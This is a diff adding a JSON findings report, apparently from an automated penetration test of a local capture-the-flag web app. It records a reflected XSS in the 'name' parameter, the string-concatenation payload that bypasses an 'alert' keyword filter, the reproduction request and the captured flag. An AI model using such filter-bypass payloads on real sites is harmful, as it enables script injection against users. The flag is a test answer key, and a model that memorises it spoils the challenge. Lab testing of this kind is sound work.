@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T01:05:00.334804+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d57292cd-d52c-4c86-a8a0-3bc357e5b46b",
+      "timestamp": "2026-04-13T01:05:00.332032+00:00",
+      "title": "Reflected XSS via name parameter \u2014 filter bypass using string concatenation",
+      "severity": "critical",
+      "target": "http://172.17.0.1:50935/page",
+      "description": "The /page endpoint reflects the `name` GET parameter directly into the HTML body without sufficient sanitization. The server blocks the literal string 'alert', but this filter is trivially bypassed by splitting the function name via JavaScript string concatenation: window['al'+'ert']('XSS'). The X-XSS-Protection header is explicitly set to 0, confirming the challenge is designed for client-side exploitation.",
+      "evidence": "GET /page?name=<script>window['al'%2B'ert']('XSS')</script>\n\nResponse body contains:\n<div class=\"solution-text\">...<br>Congratulations!<p> Here is the flag: flag{2fba7376-856b-4b60-8eeb-c54c23186622}</div>\n<input type=text name=name placeholder=\"Enter your name...\" > <script>window['al'+'ert']('XSS')</script>>\n\nFLAG: flag{2fba7376-856b-4b60-8eeb-c54c23186622}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:50935/page?name=<script>window['al'%2B'ert']('XSS')</script>",
+        "expected": "Page renders script tag; server responds with Congratulations and the flag"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "c9f6d90d-c98d-4504-9be2-9ed894d94035",
+      "timestamp": "2026-04-13T01:05:09.956535+00:00",
+      "title": "Dalgona CTF App Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Home[\"GET / (index)\"]\n  Home --> Page[\"GET /page?name=INPUT\"]\n  Page --> Filter[\"Server-side filter: blocks 'alert'\"]\n  Filter --> Reflect[\"name reflected into HTML body\"]\n  Reflect --> XSS[\"XSS via window alert bypass\"]\n  XSS --> Flag[\"flag 2fba7376-856b-4b60-8eeb-c54c23186622\"]"
+    }
+  ]
+}
